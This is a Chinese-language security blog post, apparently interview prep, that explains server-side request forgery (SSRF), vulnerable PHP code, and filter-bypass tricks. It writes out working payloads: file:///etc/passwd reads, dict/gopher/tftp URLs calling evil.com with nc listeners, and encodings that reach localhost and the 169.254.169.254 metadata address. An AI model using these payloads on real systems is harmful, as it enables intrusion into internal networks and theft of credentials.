<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="Brathon"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://evan.beee.top" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="canonical" href="https://fiddling.blog/2023/07/19/不过是ssrf-为什么面试官老问这个？/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="false"><meta property="og:type" content="article"><meta property="og:title" content="不过是SSRF 为什么面试官老问这个？"><meta property="og:url" content="https://fiddling.blog/2023/07/19/%E4%B8%8D%E8%BF%87%E6%98%AFSSRF-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9D%A2%E8%AF%95%E5%AE%98%E8%80%81%E9%97%AE%E8%BF%99%E4%B8%AA%EF%BC%9F/index.html"><meta property="og:site_name" content="Brathon&#39;s Blog"><meta property="og:description" content="false"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/why-ssrf/72b4b351a2e6b6282a2480003573bcc2.7c30f2vf8yc0.webp"><meta property="article:published_time" content="2023-07-19T10:39:02.000Z"><meta property="article:modified_time" content="2023-07-19T10:40:52.000Z"><meta property="article:author" content="Brathon"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/why-ssrf/72b4b351a2e6b6282a2480003573bcc2.7c30f2vf8yc0.webp"><link rel="icon" type="image/png" href="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/brthton icon.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/brthton icon.png"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/brthton icon.png"><title>不过是SSRF 为什么面试官老问这个？ - Brathon&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.1.2/source/assets/fonts.css"><script data-pjax async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9466387333958601" crossorigin="anonymous"></script><script id="hexo-configurations">let Global=window.Global||{};Global.hexo_config={hostname:"fiddling.blog",root:"/",language:"zh-CN",path:"search.xml"},Global.theme_config={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!0,link_icon:!0},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[""]},code_block:{copy:!0,style:"mac",font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:5,number:!1,expand:!0,init_open:!0},copyright:!0,lazyload:!0,recommendation:{enable:!0,title:"推荐阅读",limit:3,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},busuanzi_counter:{enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},pjax:!0,open_graph:!0},home_banner:{enable:!0,image:{light:"/images/wallhaven-wqery6-light.webp",dark:"/images/wallhaven-wqery6-dark.webp"},title:"Brathon's Blog",subtitle:{text:["Fiddling科技工作室","没事瞎捣鼓协会荣誉成员","Welcome and Enjoy!"],hitokoto:{enable:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!1,links:{github:null,instagram:null,zhihu:null,twitter:null,email:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null}]},mermaid:{enable:!1,version:"9.3.0"},all_minifier:!0},version:"2.1.2",navbar:{auto_hide:!0,color:{left:"#f78736",right:"#367df7",transparency:45},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-regular fa-archive"},Friends:{path:"/links/",icon:"fa-solid fa-link"},Tags:{path:"/tags/",icon:"fa-solid fa-tags"},"资源":{icon:"fa-solid fa-books",submenus:{"工具箱":{path:"/tools/",icon:"fa-regular fa-hammer"},"电影":{path:"/films/",icon:"fa-solid fa-films"},"音乐":{path:"/musics/",icon:"fa-solid fa-music"},"书籍":{path:"/books/",icon:"fa-regular fa-book-open"}}}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"cloud"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:"达瓦里氏，革命尚未结束，信念不能动摇。",links:null},article_date_format:"auto",categories:{enable:!0,limit:3},tags:{enable:!0,limit:3}}},Global.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"}</script><link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.1.2/source/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.1.2/source/fontawesome/brands.min.css"><link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.1.2/source/fontawesome/solid.min.css"><link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.1.2/source/fontawesome/regular.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span> <span class="pjax-progress-icon"><i class="fa-solid fa-circle-notch fa-spin"></i></span></div><main class="page-container"><div class="main-content-container"><div class="main-content-header"><header class="navbar-container"><div class="navbar-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/brthton%20icon.png"> </a><a class="logo-title" href="/">Brathon&#39;s Blog</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house"></i> 首页</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive"></i> 归档</a></li><li class="navbar-item"><a href="/links/"><i class="fa-solid fa-link"></i> 友情链接</a></li><li class="navbar-item"><a href="/tags/"><i class="fa-solid fa-tags"></i> 标签</a></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="return!1"><i class="fa-solid fa-books"></i> 资源&nbsp;<i class="fa-solid fa-chevron-down"></i></a><ul class="sub-menu"><li><a href="/%5Bobject%20Object%5D">工具箱</a></li><li><a href="/%5Bobject%20Object%5D">电影</a></li><li><a href="/%5Bobject%20Object%5D">音乐</a></li><li><a href="/%5Bobject%20Object%5D">书籍</a></li></ul></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer"><ul class="drawer-navbar-list"><li class="drawer-navbar-item flex-center"><a href="/"><i class="fa-regular fa-house"></i> 首页</a></li><li class="drawer-navbar-item flex-center"><a href="/archives"><i class="fa-regular fa-archive"></i> 归档</a></li><li class="drawer-navbar-item flex-center"><a href="/links/"><i class="fa-solid fa-link"></i> 友情链接</a></li><li class="drawer-navbar-item flex-center"><a href="/tags/"><i class="fa-solid fa-tags"></i> 标签</a></li><li class="drawer-navbar-item flex-center"><a class="has-dropdown" href="#" onclick="return!1"><i class="fa-solid fa-books"></i> 资源&nbsp;<i class="fa-solid fa-chevron-down"></i></a></li><li class="dropdown-item flex-center"><a class="dropdown-item" href="/%5Bobject%20Object%5D">工具箱</a></li><li class="dropdown-item flex-center"><a class="dropdown-item" href="/%5Bobject%20Object%5D">电影</a></li><li class="dropdown-item flex-center"><a class="dropdown-item" href="/%5Bobject%20Object%5D">音乐</a></li><li class="dropdown-item flex-center"><a class="dropdown-item" href="/%5Bobject%20Object%5D">书籍</a></li></ul></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><h1 class="article-title-regular">不过是SSRF 为什么面试官老问这个？</h1></div><div class="article-header"><div class="avatar"><img src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/brthton%20icon.png"></div><div class="info"><div class="author"><span class="name">Brathon</span> <span class="author-label"></span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2023-07-19 18:39:02</span> <span class="mobile">2023-07-19 18:39</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2023-07-19 18:40:52</span> <span class="mobile">2023-07-19 18:40</span> <span class="hover-info">更新</span> </span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.6k 字</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>14 分钟</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body"><blockquote><p>回想起面试的时候总会遇到面试官问这个问题</p></blockquote><h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>SSRF（Server-Side Request Forgery）是一种安全漏洞，它允许攻击者在服务器端发起未经授权的请求。通过利用SSRF漏洞，攻击者可以发送伪造的请求，使服务器主动发起与其他内部或外部资源的通信，例如<strong>访问内部系统、绕过防火墙、读取敏感数据</strong>或<strong>攻击其他服务器</strong>。</p><p>SSRF漏洞通常出现在服务器端代码中，其中用户输入未经适当验证和过滤地被用于构造请求的<strong>URL或参数</strong>。攻击者可以利用这些漏洞来伪造请求，使服务器向受攻击的目标发起请求，而不是合法的请求目标。</p><h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p></p><figure class="image-caption"><img lazyload src="/images/loading.svg" data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/why-ssrf/72b4b351a2e6b6282a2480003573bcc2.7c30f2vf8yc0.webp" alt="72b4b351a2e6b6282a2480003573bcc2"><figcaption>72b4b351a2e6b6282a2480003573bcc2</figcaption></figure><p></p><ol><li>用户输入：攻击者通过某种方式将恶意的URL或参数作为用户输入提交给服务器端的应用程序。</li><li>构造请求：应用程序接收到用户输入后，将其用于构造请求的URL或参数。</li><li>发起请求：服务器端应用程序使用构造的URL或参数发起请求。这个请求可以是HTTP、FTP、DNS或其他协议。</li><li>目标选择：攻击者可以利用SSRF漏洞来选择请求的目标。这可以是内部系统、本地文件、外部服务或其他受攻击的目标。</li><li>数据获取或攻击：服务器端应用程序发起的请求将返回响应。攻击者可以获取响应中的数据，进行进一步的攻击，或者利用响应中的信息来探测和利用其他系统漏洞。</li></ol><p>SSRF 形成的原因大都是由于 <strong>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制</strong>。</p><h2 id="SSRF漏洞危害"><a href="#SSRF漏洞危害" class="headerlink" title="SSRF漏洞危害"></a>SSRF漏洞危害</h2><ol><li><p>访问内部系统：攻击者可以利用SSRF漏洞来发起请求，访问本地或内部网络中的敏感系统和服务。这可能包括数据库、文件系统、管理接口、内部API等。攻击者可以读取、修改或删除敏感数据，或者执行其他恶意操作。</p></li><li><p>绕过防火墙和安全限制：通过利用SSRF漏洞，攻击者可以请求绕过防火墙或安全限制的资源。例如，攻击者可以访问内网资源，绕过防火墙规则，或者通过攻击内部系统来获取敏感信息。</p></li><li><p>发起攻击：攻击者可以利用SSRF漏洞来发起攻击，例如通过请求恶意URL或构造特定的请求参数来利用其他系统的漏洞。这可能导致远程代码执行、拒绝服务攻击、服务器劫持等。</p></li><li><p>敏感信息泄露：通过SSRF漏洞，攻击者可以获取到内部系统的敏感信息，例如配置文件、API密钥、数据库凭据等。这可能导致数据泄露、隐私问题以及其他安全风险。</p></li><li><p>滥用服务器资源：攻击者可以利用SSRF漏洞来滥用服务器资源，例如通过请求大量的远程URL来消耗服务器的网络带宽、CPU或内存资源，导致服务不可用或降级。</p></li></ol><h2 id="SSRF利用点"><a href="#SSRF利用点" class="headerlink" title="SSRF利用点"></a>SSRF利用点</h2><p>简单来说，就是访问网站，网站需要从指定url再获取资源时，没有对url中的资源地址进行限制，从而达到黑客可以对访问地址的重新构造。<br>这种现象通常场景有：</p><ol><li>分享：通过url分享其他网站内容；</li><li>转码：为了适配不同设备，而通过其他服务商提供的转码功能进行转码适配；</li><li>在线翻译：把其他公司的翻译服务功能，通过url放置本地；</li><li>图片、文章分享：类似于分享功能中的获取url的功能，不过这次是获取图片等；</li><li>利用他站api功能：借用他功能为本站用户服务；<br>等等。。。</li></ol><blockquote><p>以上，可以从目标站的url中寻找以下关键字：</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">share  </span><br><span class="line">wap  </span><br><span class="line">url  </span><br><span class="line">link  </span><br><span class="line">src  </span><br><span class="line">source  </span><br><span class="line">target  </span><br><span class="line">u  </span><br><span class="line">display  </span><br><span class="line">sourceURl  </span><br><span class="line">imageURL  </span><br><span class="line">domain</span><br></pre></td></tr></table></figure></div><p>如果发现目标站url中存在以上关键字，同时存在关键字后接&#x3D;，并定向到某个协议的url，那么我们可以继续利用协议构造攻击参数。</p><blockquote><p>相关伪协议</p></blockquote><ul><li><p>file:&#x2F;&#x2F; – 本地文件传输协议，主要用于访问本地计算机中的文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php？url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure></div></li><li><p>dict:&#x2F;&#x2F; – 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/  </span><br><span class="line">evil.com:$ nc -lvp 1337 </span><br><span class="line"></span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]  </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></div><ul><li>sftp:&#x2F;&#x2F; – SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/  </span><br><span class="line">evil.com:$ nc -lvp 1337  </span><br><span class="line"></span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]  </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></div><ul><li>ldap:&#x2F;&#x2F; – 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></div><ul><li><p>tftp:&#x2F;&#x2F; – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET  </span><br><span class="line">evil.com:# nc -lvup 1337  </span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></div></li><li><p>gopher:&#x2F;&#x2F; – 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;  </span><br><span class="line">evil.com:# nc -lvp 1337 </span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></div></li></ul><p>要注意的是，有些网站后端语言可能使用的伪协议不同，比如Java的局限性，实际场景一般利用http、https、file协议等等。</p><table><thead><tr><th></th><th>PHP 支持的协议</th><th>java支持的协议</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>✅</td><td>✅</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>✅</td><td>✅</td></tr><tr><td>ftp:&#x2F;&#x2F;</td><td>✅</td><td>✅</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>zlib:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>data:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>glob:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>ssh2:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>rar:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>ogg:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>expect:&#x2F;&#x2F;</td><td>✅</td><td></td></tr><tr><td>mailto：&#x2F;&#x2F;</td><td></td><td>✅</td></tr><tr><td>netdoc：&#x2F;&#x2F;</td><td></td><td>✅</td></tr><tr><td>gopher：&#x2F;&#x2F;</td><td></td><td>✅</td></tr><tr><td>jar：&#x2F;&#x2F;</td><td></td><td>✅</td></tr><tr><td>etc.</td><td></td><td></td></tr></tbody></table><h2 id="代码中的SSRF"><a href="#代码中的SSRF" class="headerlink" title="代码中的SSRF"></a>代码中的SSRF</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>在PHP中，以下函数可能会引发SSRF漏洞：</p><ol><li><p><code>file_get_contents()</code>：用于读取文件内容，也可以读取远程URL的内容。</p><p>代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户</p></li></ol><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;url&#x27;]))  </span><br><span class="line">&#123;  </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]);  </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;;  </span><br><span class="line">file_put_contents($filename, $content);  </span><br><span class="line">echo $_POST[&#x27;url&#x27;];  </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">echo $img;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><ol start="2"><li><p><code>fopen()</code>：用于打开文件或URL，可以读取远程URL的内容。</p></li><li><p><code>curl_exec()</code>：用于执行CURL请求，可以发送HTTP请求到远程URL。</p><p>通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名</p></li></ol><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))  </span><br><span class="line">&#123;  </span><br><span class="line">$link = $_POST[&#x27;url&#x27;];  </span><br><span class="line">$curlobj = curl_init();  </span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);  </span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);  </span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);  </span><br><span class="line">$result=curl_exec($curlobj);  </span><br><span class="line">curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;  </span><br><span class="line">file_put_contents($filename, $result);  </span><br><span class="line">echo $result;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><ol start="4"><li><p><code>get_headers()</code>：用于获取URL的HTTP响应头。</p></li><li><p><code>simplexml_load_file()</code>：用于加载XML文件，也可以加载远程URL的XML数据。</p></li><li><p><code>include()</code> 和 <code>require()</code>：用于包含其他文件，如果允许包含远程URL，则可能导致SSRF漏洞。</p></li></ol><p><em>相关代码实例待补充</em></p><p>需要注意的是：<br>一般情况下PHP不会开启fopen的gopher wrapper ；</p><p>file_get_contents的gopher协议不能URL编码 ；</p><p>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 ；</p><p>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 ；</p><p>curl_exec() 默认不跟踪跳转；</p><p>file_get_contents() file_get_contents支持php:&#x2F;&#x2F;input协议</p><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><ol><li><p><code>HttpClient.execute</code>：这是Java中<code>HttpClient</code>类的一个方法。它用于执行一个HTTP请求并返回一个<code>HttpResponse</code>对象。<code>HttpClient</code>类是Apache HttpClient库的一部分，它提供了一组用于执行HTTP请求的API。</p></li><li><p><code>HttpClient.executeMethod</code>：这是<code>HttpClient</code>类中的另一个方法，用于执行一个HTTP方法请求。它接受一个<code>HttpMethod</code>类的实例作为参数，并返回一个<code>int</code>类型的状态码。</p></li><li><p><code>HttpURLConnection.connect</code>：这个方法是<code>HttpURLConnection</code>类的一部分。它用于建立与<code>HttpURLConnection</code>对象指定的URL的连接。在调用此方法之后，您可以使用<code>HttpURLConnection</code>类中的其他方法与资源进行交互。</p></li><li><p><code>HttpURLConnection.getInputStream</code>：这个方法用于从<code>HttpURLConnection</code>对象获取输入流。它返回一个<code>InputStream</code>类的实例，可以用于从资源中读取数据。</p></li><li><p><code>URL.openStream</code>：这个方法是<code>URL</code>类的一部分。它用于打开到URL的连接，并返回一个用于从该连接读取的输入流。</p></li><li><p><code>HttpServletRequest</code>：这是Java中的一个接口，表示一个HTTP请求。它是Java Servlet API的一部分，提供了访问请求的各个方面的方法，如请求参数、头信息和输入流。</p></li><li><p><code>getParameter</code>：这个方法是<code>HttpServletRequest</code>接口的一部分。它用于获取请求参数的值。参数名作为字符串传递给该方法，它返回相应的值作为字符串。</p></li><li><p><code>URL</code>：这个类表示Java中的统一资源定位符（URL）。它提供了与URL一起工作的方法，如获取协议、主机、路径和查询参数等。</p></li><li><p><code>HttpClient</code>：这是Apache HttpClient库中的一个类。它提供了一组用于执行HTTP请求和处理响应的API。它可用于向服务器发送HTTP请求并接收相应的响应。</p></li><li><p><code>Request</code>：这是一个封装了HTTP请求的类。它是对<code>HttpClient</code>类的封装，为进行HTTP请求提供了更方便和用户友好的接口。</p></li><li><p><code>HttpURLConnection</code>：这是Java中表示HTTP连接的一个类。它提供了设置请求属性、发送请求和处理响应的方法。</p></li><li><p><code>URLConnection</code>：这是Java中的一个抽象类，表示与URL的连接。<code>HttpURLConnection</code>类是<code>URLConnection</code>的子类，为处理HTTP连接提供了额外的方法和功能。</p></li><li><p><code>okhttp</code>：这是一个流行的开源Java HTTP客户端库。它提供了一个简单高效的API，用于发送HTTP请求和处理响应。它广泛用于Android开发，并支持连接池、请求&#x2F;响应拦截和响应缓存等功能。</p></li><li><p><code>BasicHttpEntityEnclosingRequest</code>：这是Apache HttpClient库中的一个类。它是<code>HttpEntityEnclosingRequest</code>接口的基本实现，表示可以包含实体（如请求体）的HTTP请求。</p></li><li><p><code>DefaultBHttpClientConnection</code>：这是Apache HttpClient库中的一个类。它是<code>BHttpClientConnection</code>接口的默认实现，表示可用于发送和接收请求和响应的HTTP连接。</p></li><li><p><code>BasicHttpRequest</code>：这是Apache HttpClient库中的一个类。它是<code>HttpRequest</code>接口的基本实现，表示一个HTTP请求。</p></li><li><p><code>URI</code>：这个类表示Java中的统一资源标识符（URI）。它提供了用于处理URI的方法，如解析、解析和规范化等操作。</p></li></ol><p>java代码太长了，不粘了，找几个CVE代审的文章贴这里，各位自行浏览：<br><a class="link" target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2204394">https://cloud.tencent.com/developer/article/2204394 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="绕过办法"><a href="#绕过办法" class="headerlink" title="绕过办法"></a>绕过办法</h2><p>已知ssrf这么高危的漏洞必然是要被各位重视的，那么肯定早就有防范办法了</p><p>那么，绕！</p><ol><li><p>限制为<a class="link" target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 域名时（利用@）</p><blockquote><p>可以尝试采用http基本身份认证的方式绕过<br>如：<a class="link" target="_blank" rel="noopener" href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在PHP的parse_url中会识别<a class="link" target="_blank" rel="noopener" href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote></li><li><p>采用短网址绕过</p><blockquote><p>比如百度短地址<a class="link" target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote></li><li><p>采用进制转换</p><blockquote><p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote></li></ol><p>4.利用特殊域名</p><blockquote><p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p></blockquote><p>5.利用[::]</p><blockquote><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p></blockquote><p>6.利用句号</p><blockquote><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p></blockquote><p>7、CRLF 编码绕过</p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入<br><code>example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a</code>1</p></blockquote><p>8.利用封闭的字母数字</p><blockquote><p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ 